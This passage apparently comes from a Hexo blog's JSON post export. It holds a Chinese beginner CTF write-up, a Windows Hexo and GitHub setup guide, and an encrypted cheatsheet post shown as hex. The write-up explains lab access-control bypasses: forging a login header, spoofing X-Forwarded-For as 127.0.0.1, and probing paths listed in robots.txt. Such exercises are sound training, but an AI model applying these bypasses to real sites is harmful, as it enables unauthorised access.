mFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0= base64解码，python引用base64库写脚本(共经过了20次解码) 12345678import base64s = input()try: while True: s = base64.decodestring(s)except Exception: print s 第四题据说MD5加密很安全，真的是么？分值: 200e0960851294d7b2253978ba858e24633 第五题种族歧视分值: 300小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！通关地址 第六题HAHA浏览器分值: 200据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？通关地址 第七题key究竟在哪里呢？分值: 200上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？通关地址 第八题key又找不到了分值: 350小明这次可真找不到key去哪里了，你能帮他找到key吗？通关地址 最初判断中间很快地跳过了一个页面。headers中发现原本应该转到key_is_here_now.php，但通过location转到了index_no_key.php，拼接url后找到key 第九题冒充登陆用户分值: 200小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？通关地址 将headers中的login=0改为login=1就能得到key 第十题比较数字大小分值: 100只要比服务器上的数字大就可以了！通关地址 将网页源代码中的maxlength更改后重新打开网页输入大于999的数字得到key 第十一题本地的诱惑分值: 200小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？通关地址 X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。 在headers中添加X-Forwarded-For：127.0.0.1，然后就能在response里得到key。 第十二题就不让你访问分值: 150小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!通关地址 Robots协议（也称为爬虫协议、机器人协议等）全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。 通过爬虫协议发现有disallow的地方，就尝试进去。又发现有提示login page，就加上login.php，就能得到key了","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"Windows下利用Hexo和Github搭建博客","slug":"Windows下利用Hexo和Github搭建博客","date":"2017-11-18T14:12:54.000Z","updated":"2020-03-06T11:09:36.470Z","comments":true,"path":"2017/11/18/Windows下利用Hexo和Github搭建博客/","link":"","permalink":"blog.b3ale.cn/2017/11/18/Windows下利用Hexo和Github搭建博客/","excerpt":"记录下在 Windows 下搭建博客的步骤。","text":"记录下在 Windows 下搭建博客的步骤。 下载安装 gitgit 下载地址 下载安装 node.jsnode.js 下载地址 github 账号注册和新建仓库仓库名必须为“账户名.github.io”，勾选“Initialize this repository with a README” 安装 hexo通过命令行输入 12npm install hexo -g# 可以加上 --registry=https://registry.npm.taobao.org 注：-g 是指全局安装 Hexo。 再输入 1hexo -v 检测是否安装成功 初始化 Hexo创建文件夹根据个人爱好在本地创建博客文件夹，用于保存博客的本地文件 初始化在 Hexo 文件下，右键运行 Git Bash，输入命令： 1hexo init 初始化成功后生成的一系列文件，再输入： 12npm install# 可以加上 --registry=https://registry.npm.taobao.org 安装所需要的组件。 配置在 _config.yml，进行基础配置。 本地浏览博客分别输入如下命令： 12hexo ghexo s 在浏览器输入：localhost:4000，就可以对本地的博客进行访问。 写文章在博客文件夹下输入： 1hexo new post &quot;xxx&quot; 即能创建新博文，声称在 _posts 文件夹下，或是在 _posts 文件夹下，新建 .md 文件就可以写文章。 ssh 设置在博客文件夹下打开 Git Bash 后，分别输入： 1git config --global user.name &quot;你的名字&quot; 和： 1git config --global user.email &quot;你的邮箱&quot; 输入： 1cd ~/.ssh 再输入： 1ssh-keygen -t rsa -C &quot;你的邮箱&quot; 连续三个回车，生成密钥。再输入： 1eval &quot;$(ssh-agent -s)&quot; 以添加密钥到 ssh-agent。再输入： 1ssh-add ~/.ssh/id_rsa 添加生成的 SSH key 到 ssh-agent。然后登陆 github，点击头像下的 settings，添加一个新的 ssh，将 id_rsa.pub 文件里的内容复制上去。输入： 1ssh -T git@github.com 如果出现“Hi 你的名字”，说明成功了。 假如 ssh-key 配置失败首先，清除所有的 key-pair： 12ssh-add -Drm -r ~/.ssh 删除你在 github 中的 public-key。重新生成 ssh 密钥对： 1ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot; 部署到 Github在 _config.yml 进行配置···ymltype: gitrepository: https://github.com/你的名字/你的名字.github.iobranch: master··· 安装 hexo-deployer-git 自动部署发布工具12npm install hexo-deployer-git --save# 可以加上 --registry=https://registry.npm.taobao.org 发布到 Github输入如下命令： 1hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 第一次发布需要验证 github 账号。浏览器打开“你的名字.github.io”，就是你的博客了。这样就完成了简单的搭建。","categories":[],"tags":[{"name":"windows","slug":"windows","permalink":"blog.b3ale.cn/tags/windows/"},{"name":"hexo","slug":"hexo","permalink":"blog.b3ale.cn/tags/hexo/"},{"name":"github","slug":"github","permalink":"blog.b3ale.cn/tags/github/"}]},{"title":"CTF CheatSheet by AssassinQ","slug":"CTF-CheatSheet-by-AssassinQ","date":"1969-12-31T16:00:00.000Z","updated":"2020-03-16T03:10:37.275Z","comments":true,"path":"1970/01/01/CTF-CheatSheet-by-AssassinQ/","link":"","permalink":"blog.b3ale.cn/1970/01/01/CTF-CheatSheet-by-AssassinQ/","excerpt":"Continue Reading...","text":"Enter Password and Continue Reading... 33ba61e20bc39ad8f18bf8924202a015889adb009f73bedbb4c257e3759f480620e86edb1880390bb72371e75e0ee53db811a123d2c9b29c350b9b2e2d8cf548198e09a0482ebc0403fdcd89b1ea1ad9d36f2769bd4759dc403a24008d8269726bf21555d26e6c93125129f4429e13339e3b4f0522441ce57534d64d5a2dcb0e19acb0b6b083df8d396a06b675c7c7b548f4809d7cd54e0bd2f87fd4920876cbe60ae36343ab8c401c18c5b3a01ca9aa02cf1a3ee91ba5c4f4240266c1528dce5f4d6c05b6862aa32acfec49ae82f4ed430fa6c5491c228de59df39fbe67caf0abdfe3cf84cb26d71948d62a28ce8a94d157ffa95560df0d5431bcbc1962daf9ecd4566a05c776113b1b8fc7f5fe911b7bb8fc8ee8246a439e34a9a153bccff4a7c9ff811d072504aeb28a792413a1d00dba54ab9e9e9b36e7c9d282a210dc7e988318bb612b86b88d1dac845ab89aa4e2246b8b66e1eea2f490b62953d32f451628fdeeb6e76b47fff06222a1e21e78f1df29ae2d467f63348e8599c79dd73a490c7194343b5557052502648e52251ad9d55cc20b3934257d04ec1a63e0fb1407674445d794c6d4fab8da3ef58f12e18a399f12f8fa953de170744feee8734f3ebc2a6b0520f113e541e6da96952ff245ca8cf821bb166b0abdd04a9a96352013e6bb7eebfcb9b19bd8dbada1f044da6c3ca0bd73f5a8fe7e76e710130fc428cc5730bddf3adddd190ab911c6193458b33306467067813cae125cfa33da82dd9cd7f2645adf20223362188876b57d3574032cf8a286343b9af97369c025837644619df8154322cb729dbe5f79cc0c378f316ce93f86db81a6797d83de5b83b554577f397f59e13649c17a7b77ab5d198792a4a45b1819a0c30022036729d2e435f572de4d25e4f4967d5f8a64ded6ec01fe3de1178620d9bbcf920f175f9d20a9e90685e7cfe993f6b3fa67a9fcd2ba420ae26165882e6de0a3703c6e586cd8f0c313329f489bede26233656f648c69691e4c92b3babf5b942e7e2a36b2d21891a7a673a725dc097bd7de59f74fec723b9ea9ae205f8f5cc284901ed77cddf1aadae2135e3ff7af6c7c0575930e65d05a26db9fa12b90f1d161f6750fb822da755faa3cdaa50a8a9214b49c249b444c5af9d4f5adafbf9d4dc1d5c34b6dc7799835184494256a3746ab2df2ae9dc6d82f0e18282ba6d5d81d09a2a2199f32c9f6d1c7b2da736c56ce71a76cae2e7c89c81790364500d92f9ba639fced37ef3369501119cf9fb8c7a32f542690c91cd59af3f2e5fa998b4972de889ef1509c0be9094696d7247e0cc740f160d3c9c6a96f6d73b939bc4ad206ba5300659f2f4a8a10b753d831499973bc207f34c40390f5940ed00057d8645c4172087f1acda34ea02e4adb83991d27a9926b4fd3c6e419b18819cea795d9d94b3588f411f37fed7ee0d0ff4707fb89e0eb35b0b967b2aedeed7ef23e8a934c7df13a254bc8114f907d029fa7a5d26a4d2e3a499c8f92196cf97c64f9e6ebd1f1ad230c2aa841c87287cc53d7c352228f6d2b2d6fb765d8d82ceb349cf912b5b39dbc90eb750357ab7ce925de7f10ca91c869c77a940ac0fe9ee573ebb65498b14304953ad7874af019fcf6f0bbec8f55a570e79adb944200629373da37079850a9811a791e26021fa3c4695539d55eb0bfb2783ca4af0a6f00ad0be84feeca0c3fc29fbec2d38c99015ad799085826546166fb8a612392f3e71dfcd316b89d4e17cc619b9a6adba2d99d7ca532e65187d7d68ea5d11e4efcfcc9669498b949433193887de86e84cb5565fca4c6f09e92be61bcc7ed7d94502b57dfe279e5421a5f11e90dfdf5ac7acf8250166b76608d30fbdac3da5dd84a585495195fe262bcc1efef01e7c8769eb578448166bc32e6e18f674bcfb25b25fcde9c0a450a005ae3eee818ed5a6a02c7332357a265e50e05287a407830aa694d2e2e9256804d3a5f2c3633ac8662178e44dd6ad20f0759122dae74dbafdaf2dbf6eb0aa29f7c0b0c2a18bea9f39cff06382b68f1d42fc469246419245f06251946febc0ade36b4d6b185bcc9bab04729021bfaa608739adb3477907474f76ac8321c6e50781f30930546dfba06d0f6e275bd2660c8a6250e8fcd40402b9f8c0fcb99c62610f59ed30d9aac8385c4d495b0d8a09945d9310f2e17789c09cacd024d0c4259ef167e0492d5888d22851067a41996315464dc41dbb5eabd6be2bf532cf29f1e9096fa887adb8a8a59ec4afe76d0ad9aa4918011a3936b55109921e4c5c2bd9817c0fb85ebe1a6f5bbe99b3abdeaf5b3bed89df5525b3c7d9990c72e74ea1ca8fafc5bf10f1c2fec123e1002407ed8366cfaefa5cea0bde01c710a2134cc334a1b2362427f12906569a710cc1974cfb5e7c5949b2e2d452cbb90f1a77394d05dea2079df5de44bd99ad531bd946d7fb0aeb4686e23da467f86478a42a380cc48ac8af971ef783990feadd4aa2aa92af88b8c5db7b0b0ceed99a7b2aad3fa9a437e9023f3beb34e1dccfb8ce3ffed25217392b1e49784f9b3d37c43e97e624b7c583d540d739a1ebacc4578a50451d99c06f63d4fc0133937d192f87402dc9ef1efd32f46852f627aee8f7b62b0b6e84c9857db17e8dd2be65f1b5b35defdab80b820e1d53c8c2da6091019e16a400c3afee196d384c025d8317c1d121b688f9116bf8269fe702ed8f07897f3e4b769749168014aab52aa195a723ccd42df50509c21f3b5af908a081270d7d50e519b68ab45bff2a38f1e6552105114bab23c663b27609f04a83a58ab03c433460fb9dcaef680991b746906335c08a7ee8e5bdeca7cfbeef771531f9ac9fb5774791867b245baacbb5757833ce47936f8d628b6f266c7549795aae3d27c16de55705f5d1e01071b032b448c48e5b2ccbce45d0a4096ea0dc0553d9e999a863521bcd5f7a0984eab8777ec5f7bc1086c13d3347a1f8a90b2c2369eeaf2f461a30d6030cdefd1e4d990221b8a8af665ce75bcbf1d210745e317ecaa078c47bc4d859988ceebf856001f9ccac35dc64da854072f86ea7ce7067fcea57d1acb2a3e09c4f1fd9189933a95210231376943f51dc37641f4daa90b7e1c45143c76e821f35122ba24c4cc1b00a3a7acd7964edecccde2c3e71156e91379fc5ce01cf4df88cbcc092b9b5693537ea915e91da40f0909dcffe087067585cb91d3c9b1e84dd133a230c7d7205c0bc696b7356e51ac1fa9e8fbb9f459a4533a497bbdd5f4e1732c82c094ec1a213a4b6c0a4189fb4668a2812ec9dfb94cd963f7d04925471c18542fdadcce30c6a559af83932681db6e1547db9de04b4e3ba25578cc37a04106515107ec303456cfb000dce08c378c3bf0b52303ec29d045e8f9474f9a4e77dce8ee599981713cee452689e09c2faa69f951790bbe2065f52039267fc7c3daa54a8545396fb9677945b41963ec278b7a391c7acd2d5fe9a968d0b53610fb59e4b7d89f08edb2aa85bddcb980be016505a89ff87f1706a15ca53ae59326c50eda8e788209e663d2f83905fca3ec64bd0f5cadb980fd5b21fe7c38c2a3acc766d5c2d3b6e137f827788233ee1f6a717177d642f2f10dab0c97bd55e6e5bf28354a2271ad4e29b058c1538c34c798cb9a3825db9816fa47b3a69f915801db7425bfedd5c1fc24d99d5ae3fdd69ecb53d0b1bcce5622d6d250a5ebd033a4284f906ee53429acd1448efd8ce6c20a04421e01d9f2eaa5828c8c908528848d2d4275cb4283cb56bc6f8b7d38033ec7f459de50ae4ccdd934b2c06f21ed1d58997ed37dbb574e3c8aa8283284d219a948ad8576d2330e709d84cc4d6aba62f007761172bcbf51b54ecc5b0f342a9de3ee327eecc0505597a2fa44094d943a358e1d1c14863723c2bb51ddf483b2ac52beb33950ba790584923ceff762c273464f645247cac3bb0d057be2418ae1365d834346a9ddae3bdbcd96e89ab6c5f03fa148411cf697be6e979b124942543e3a8c61b5c1e30cbf3b0ed1834dff19822e057edf43caeb029df791c7786c2cefa43f6891dce27e7463034f82a57b8d1324e659645acb4df6355ea0d3bf0d26f6a3c03d1299de92664ae23543f8dc6c2d4349f16c511bf5027cbe4b47ca4c2f7264af5f52bc0da00d6323056afb2cbe4f06e293fcc46c5ad3c07638d4c884f7e2fc7cf9b00b278ba9706b3dd4d69bcf226098bce721ed4cb57ed3c476a5efa20b8b5139deb6dc92b2cda9506aaad043966b6117b558064cde019915ba92dd090c0ffef44cd9630b74c94fb75c7b3def77216a0ab334c1280ac10b9011ef213b4195ea719155857f0c79c9445d88d634f0d330a8d597c326750f08011c2ba27f438ef2c046c3fb61753bbdc4a30883bee6cf6e49a19755cfc6367b4bf739646d596d62c941cd43ff92f6bb0a11ab661d9ad68a8000b1783d9b5a8840fececfec888591bde4d660646154775d87f75682c9c7a6e340c4799099e910bd17969c8387117006bcac7daa887d8b367635c99dc5d123c18933cebdc7180e990bf007038165ec961fa442d6ba79020b64ea88479eb5bd556de38cfe53641362898b99fa44275ae688950ce037a6633238688f07713ec07ff592c352ca3eb3725483e4572a1c240a449df30b41d38b28df051b60a1cf1afcaa596050dced20aff6f438d196d2f4c3cee2235e91fdb993ed7f5714f603a86eee94924e6b8a4433888ff7540dfd86e3718ad10960161f5cc179d556c9d6c98d66ee7676aa98b95fb22c480dbd9af1bd2a006fdd6fe9bc16aaef865dcd9ac1bfd73ab184c4c44f895f7d1a39e8f4cb3d025154a9d9f495b75f170c98dfc938a7e271bdb0151f38f9403ea611832ef5050eb01aef2fd029ff244f5cae701607f6e5c3479820022ea15a22fe39404ac458ac0a4ea8658c220c47f799598535e25abe0bac8f3eb8a3ec4a26808561175fd732105fd742f9108b5cbc75f1f083da46ce82f8b3815f3d1f25bef55d3606abdf736ae63197f60f9652528d02ca9e4337c3d0bfb64ac910c8339a485d6cb824ec31cf9fd40eaa044ca225aa8af9ab6d94f9e4d119ae81146bf4cc371aae2e1468d4c8390f3fa085dcd11f6722948fba92e9c4e80ec9feec09a668bc50f4645e279f539ae67d60b00a76c37ef7b9e181ddd8c2bc9413513b7af3c921d24110509f8ba76334d9236d3eaedf8ec52ab5934a85660a0e7fc98ad660fce87fe39bd49f99c15fe9f3690f538021efd93b0af6209b3776705aec0b22a125d2dd11dc08b70e6838773f8ada126619a3187c5f453a9bb3b0c9e0dfa649e556d20caa9815be666685d64a1afbd314866a5232c7a4e156342de403d667353c905f9b3021dddf177fd31447a9f622f5185fc488b4eb51a52eec70ea6b1b32fd7709d377ab51dd123542bfcc4f49fc97bd2a075a718954ae94b7363b5e40609deab469e33e31c3fbf664a60eae5db7b824fd732972df0fb3cdb14790a60cc130e844948331899469f7b24d079b04022dd9995002f7fb4448b6628094bb288b1360706e5a0d19d5f2c16a022eaccc1f2d1ae264d63c4dd11ae0810fbcbdd649016a554a8f0ed905b954e076dbb7ba66145ef2b74ce6ac8678bec191b78c8cf243bf7364f9496f43115f5d06995991a59dcf83fbf97ea59e8787a6a9ddc39f65cd8c9ab37eab0ae9598cf82ef215f2abedf54e005fc0a29daa583852810ac6d44494c2135a7302e86a50c3b50ce93aa11a74d985ac91f688acae4398a4ca56fd1714fcb7fa1a945a4ef8f19234ad67b25ac177ef4d1edfb20593f397893de2fbbe3d2113e10b88657a81daf3fea4c0d2acd92a1fa8c59b7a7700de28ba29d9ade050b8ff788c2c255b4cae6d9cf547dc8786afc6f5ad1f9856a4b4dbd792dfe00cce32580d6cf9d2508023a66bae5e65b13f5a4bcf4e5d4c8944e439390239bdffe3f662002c7c4cb6b87dc9cc208478671cd0a458da9a92b7d356e2e3a82485be7454321d0747096f3e5817e99659c60ee67e78bec2d02a94db34d8751ca3296dbc9e4f1d1d5cda306db82993bb8e02c0a13ba1467aa0ea0480c87bed05b6248d85b5e823819cd3afbaf57028e19e89a093b21ff9ce5a6a3cc7d0275d15bac92917ac6a57428419befe87af4bc5275767844b56fa21177a5fcd31bdaf4fec12a7c1157305ce5febb248fd145bc7b337591b98b2246eb4563e8e96b7dfc1d868eebed08d2d90ee5ceabef4afbf4324d8c1dc57d87db9b5525a1ec663bbf779544cd49e42992db316ee3a0a0313ed94d003a5b415fffe1f5a12a2c746029de12a7a05deae6b3eb2c1e10125bef0886be791be1f1c121bdda7982ac48bbc95934021c7a8e2f650d44d82b151a129e00f74e4f052fd25f521c7f89e7878f4d925290e186766d5880cd886ad0f055b828af132d9fe856d0822fea7ceb04135d9b11b79e6a60aeed594059d84f9c6b5f954f2e8d997d9f276318ddbe8dbcf68185ed01f4d6ce496e130b9d8680412e7a2b1e34e7ec5844e7cda74323b5f37184c66f8716f80e9883383e5d77ab5c6234f6156b7ab41f62760e45b2511ee88f146ea50a937d68aaa7503bb51a31ad21372d77feec2c11f3c8da43856ae164816315de6ab9a301e941c12ee9f9b7a85e72d8a251807c192c23f4e4265ca43208ecf99b2d750e694cf81aa47656466d33d342e7f703873c66df155771c37b80f3d02f5569b05abf47df8b1e7ce7245e6f52949547945892680357e8990e4af51b3c0cfffadedabf46248e7cf767fe675e316a4e574e60679228928e8d9531d3a56508ec4620e1079afffb8de714850b7a4437e4025e493bfe63b9ae64af27b0d937b387135f040a2145ebe8713af824ce9fa1fa686d7e6a53ebd9fc4243e0c152238a3dee6d736be4bf9a7a47f25bfa54b0c6c604ccd1fb0501db884519807f35e3bbbec6ce4b1955e4b1ed07d5c8e0423e52660e1db5b359f0b1dc5a369524730d245bb48c0de358606aaffe6d573859a04e3e5c4667cd6c76bb7bfb538a7daaeec2b686d05e0614c85be719e958f52853f07463ed2e33ffaefccc1ed59e35812039a06cb01185bca762c9be0033f724f8d697eccf9cfdcff38bb9ab0405938a53971386bb6430767b57892affad9919173e280a3a50218f3db3e7b6f000baf1a6dbd120ac64b6dafe8f23d2e259b445cedd3ba625dbb748b3420ada070fed71e76d97eeab657946ed5d7551603e56b5819e1e90cf541f42e024da5631eaa78cf1393e0721cd96e1650acb912972f7e20918f7818b8319a3fe7797805b72971791165e35a894a4e5519e4ab106cea31ca19703a6f7892085caaf045f0a724503196bb072c20eb6a493bacb80159d58e04b860e7cd1e1f87e17f3ab15aebbb27e29919b12663bedc2230b207f968db875621ba8cbdcf8d124ec7d97232f58344088898a9454d731f1c3ad7d8e59083620ae89b126bdca962a715ef3fd559787002e30dc56c505f8681912e1dc21af0d135983416df361d21a6b8f63ebd34ce8a14e889af760eb6e876ce0389a1a3ae9a2728de14134aa36e7114c4de2d48609169ed058daa2c40171ee9f0209abf507bcaeb635226ce3452defb1402d994ab1a57e516a6ce75900834630a535e6b286447ccf87bf76d536b084b1271ffd7d8501f332e111daaeed14108343e1b0a37e73999029e150d076133a414f7284154815bccbd6e9b64c9890a6f24f3e88670a59d73a7e666a8a77cb50660ce5b5384720c6f77303cae52dd4150c90e5182e69ec05933b3c5d1f9a2f0bc04656954c8f99561ccbadeb21fe81125b407682e2648e0d3c12dc8a4d2b74957be870b2eb380ef57942a64387e827cc60991095d35296522ffcd109b91e77efcc6bb9c660fafbc8f385442d13ba12e499b1295c7f2981d0f229299165b74e45ad90de17477881de8b6251515eed551159723a154d3ca0eb43a54079fe1b4c62ab65743194da91b66ddefb71d8af849e41e6161d60b75d8996b9440f23005bedc013f2360780fa40686e9d68b35c8fa9830e71aaa178e4f9accc0ce7b47f189d2d2e17fd026ab969b5ed3aa51bce470fef0145a310c8bee93256e77c85bd5d76a80d04f35f180a6f8fcb206bd59fa31609cfa159b3c226a0e86b5b285578ccfea1d79aa9e21156a7f4ce45b16016276498a78a306358679ced7e4a159a8882bdcb98575ca1be913f3520fb89214d1eebaac309657a8553b9b5732af0b5405b5b623a382613ae96b600358a37f54fe45371e0d0fe48f68be3f32a75eecfc334290a29288791397e80493d1c4c98a31ba7e7e9fe2269c64cdc4e54445ad57bacca2bd12330cc98827d97a1d5567621299cc9d15af38d2ca22399bd876a097a52995d6e37011b624d8468c1ff975393e5fad55a4e56a9b46711b2822ee608b8440dc1b47952c833cc3d4b2f9d4e07fcb6850b8f52c3f143b2ed2e5375d24abdc34c0d135a7b82f1ea2e5c711e3ea5b6c7f88237b4c940a19c3e6c66b4b25138634048c87cff8e6835a9e39b8545d897f957fbdba6bc16b36c06d23706dc525df6c54e70ac9fbc153820d07aa251723c68bbb260d28f952ee453daddd0947e6d362eb5e865f2d043ea087b69165a40865d0c4b5085d2542fb1968d2f911f29f119f6d26ff5d2a64ba1ed5a8eb82356b934fa6126c0db63d56fb03e15b36ce0b51818821ea3995347e420875f23d29fc65c234ef2078fdca4603f169bd9b65d08521afe743bd152f338ff01f3a551bf1efec9aa86ea34a8640a817b5c84791402caf48f1956068b5a1e22a3106ac249b9248b72555619b2d84e70537791c95cb350376ce04fc9ded67674fc0b87858ca1207614759c5982a8f85b0b392598ab4686f83387bfaf8e3542fcdd1a2f65511e4626c8cc5bce921926f882deae6ded1e36ae8f03b50c63caa8df443475a86f7c760a5b3ecc2fdc6061a691d712c557080fa15cc386a05652ff5c78f38d8a37ae3f87e5de4711e09c3660b0df873c8544006490b5216ae45406ac738747b95887a69fb2215c04ea4a04a7812ca21273715474caac6811913bfc30ab0a12f9a7214d158464918119d505c4d5ddc2c5e6db0f75e4f7b1683e6026f94ee1b5e1a0c63fad5ca730b22382f77ad48a7827b6c5b0691f66a818d2b27153f1c5e4d4a2d3fdeabe87329b5e0c700237e15a9c4aa74514d3d2b0bd556bcf26c5acdb6b54536551810f712e9f76e3e0b286f7c2bdc80a0a84dd216bbb7f081d25e2de66e7f8b15e024a4d05f851a33df8c24d48e68c9824c44dfe8a88fd162c62e43214c8260aee18b55508cf199d158e11df2cb2947a2bf078932b31e2853c7459be9543c9fd29090b3b88865b9364859a478aab9d42ec5c17aa4342ec948a9f603f51dabe4a4fb05bb1fea1f8f676fbb1f8fa33f42fff3c96e7e3d3c19c2b71fe49518eab02ce6c789816697c7caa6acd52b804f8f991684e17c15b0887ca14920fb6f66a6b2913067de2f15e9b5a3d49eb721892a2822b384ef390f3b5e3461d51988f0e2ca3edcb7e35cdf2dcbafca2485e1415df08f5511f006b283ce595db6e6ff4d1988265b4a242145598f3dd2d1969948a5aed41ea39ca8c70038d40503af1ce5e49edf77dc2ad572a9bfc57c56e5f9d03cad6ed213eed2f78b1ad0903c0c738286af4735c4d38f500593c31eec9fecee7e20f8e162a50d7198967d742fc7f4e380049dff11a522ab790f3d3290fc9800f60a6ea97ac49f930f2508b9fead0dc2651248ae8a09c151d0a8ee907864f297bb38b326b5f58164728e6c1fdd05a4b9853344d0bb0e2f13f12b45e6b497c1af4c14996f32b0d14536efac4ffb85f98cdef1f1c20f549cd514b9ea63cd552bb416c85ca44dac184d216ff82f0fb779826f3e8e9c08f4969c30f8dcb165c2a1812096a3ee85c47144df2fab37a71b63cdef134fd9e6c11890af4eadd747e23ce41501f762865c2f112c38bc4343cd97634ccf0945c6b0a52a7a18a173914c0827030e2ed4ce36b22c876274a2faa2854dd3db2f9e81967183353a47a51e43344ec0525100c3b0e17033a57585cfc89bdd0868653b45374553e9d1f592459c0f10284fca137dbba29ee75502fa881f236c8f8fd4fa4b49def112b9c77c10c8908ccbe134c163acbf09d9ef7d7ab7ac471a4318fb78820ece25d9a9a2a3612bb23d1641e1b38b56e3c30f085de1feed1f606611a97f3891169119866dece4238ea037e34fa44c20834b0cd51ec888ee4f559a089df61fcce03b933721d2c43fdac43c0c2b544afc3ca776b9c741953c035ebbba45381f2b54b53c718d695ced8244253c7a32418619db27e68d59e25882e91a5ae6c0e3eb4e048307d9dbf5d0e52883f51759104d91961ae7d01c2554da7b02c884fc6b8d59ab866542e9a55c2bd8081ab605379ba6d0f555c6c73a167e6d67bfda519036a82a735ada9a987d4f299f135d06eff0428990ea54ecd8bd3103c97c450b82942b3c9122e7713766e8c3b352e36e169eb727860f0bb5cc8aa67cc7fdc0e52a187f099394c633652312e210840c94ec4e87c16a05470c5a99f8d8aab1c1c8c2ff5b8d7a62cc4d0a5d9a